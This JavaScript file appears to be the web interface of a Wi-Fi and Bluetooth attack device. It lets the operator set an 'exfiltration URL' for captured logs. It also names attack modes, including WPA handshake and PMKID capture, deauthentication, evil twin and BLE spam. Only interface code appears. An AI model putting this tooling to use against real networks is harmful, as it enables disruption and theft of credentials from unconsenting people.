function saveCustomUrl() {
    var url = document.getElementById("custom-url").value.trim();
    if (!url) { showDialog("Please enter a valid URL."); return; }
    if (!url.startsWith("http://") && !url.startsWith("https://")) {
        showDialog("URL must start with http:// or https://"); return;
    }
    fetch('/set-log-url', { method: 'POST', body: url })
    .then(function () { showDialog("Exfiltration URL saved."); })
    .catch(function () { showError("Failed to save URL."); });
}

function loadCurrentUrl() {
    fetch('/get-log-url')
    .then(function (r) { return r.json(); })
    .then(function (data) {
        if (data.url && data.url !== 'http://192.168.4.1/log') {
            document.getElementById("use-custom-url").checked              = true;
            document.getElementById("custom-url").value                    = data.url;
            document.getElementById("custom-url-row").style.display        = "block";
        } else {
            document.getElementById("use-custom-url").checked              = false;
            document.getElementById("custom-url-row").style.display        = "none";
        }
    })
    .catch(function () {});
}

/* ── Copy helper ─────────────────────────────────── */
function copyText(elemId, btn) {
    var text = document.getElementById(elemId).textContent;
    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(text).then(function () {
            var orig = btn.textContent;
            btn.textContent = "Copied!";
            setTimeout(function () { btn.textContent = orig; }, 1500);
        });
    } else {
        var ta = document.createElement("textarea");
        ta.value = text;
        ta.style.cssText = "position:fixed;opacity:0;";
        document.body.appendChild(ta);
        ta.select();
        document.execCommand("copy");
        document.body.removeChild(ta);
        var orig = btn.textContent;
        btn.textContent = "Copied!";
        setTimeout(function () { btn.textContent = orig; }, 1500);
    }
}

/* ── Utilities ───────────────────────────────────── */
function uint8ToHex(b) { return ("00" + b.toString(16)).slice(-2); }

function escapeHtml(s) {
    return String(s)
    .replace(/&/g,  "&amp;")
    .replace(/</g,  "&lt;")
    .replace(/>/g,  "&gt;")
    .replace(/"/g,  "&quot;");
}

function attackTypeName(t) {
    switch (t) {
        case AttackTypeEnum.ATTACK_TYPE_PASSIVE:     return "Passive Capture";
        case AttackTypeEnum.ATTACK_TYPE_HANDSHAKE:   return "WPA Handshake Capture";
        case AttackTypeEnum.ATTACK_TYPE_PMKID:       return "Clientless PMKID";
        case AttackTypeEnum.ATTACK_TYPE_DOS:         return "Deauthentication (DoS)";
        case AttackTypeEnum.ATTACK_TYPE_BEACON_SPAM: return "Beacon Spam";
        case AttackTypeEnum.ATTACK_TYPE_PROBE:       return "Ghost Mode (Probe Spam)";
        case AttackTypeEnum.ATTACK_TYPE_EVIL_TWIN:   return "Evil Twin";
        case AttackTypeEnum.ATTACK_TYPE_BT_SPAM:     return "BLE Spam";
        case AttackTypeEnum.ATTACK_TYPE_CLONE:       return "Super Clone";
        case AttackTypeEnum.ATTACK_TYPE_BT_PAYLOAD:  return "BT Payload (HID)";
        default: return "Unknown (" + t + ")";
    }
}
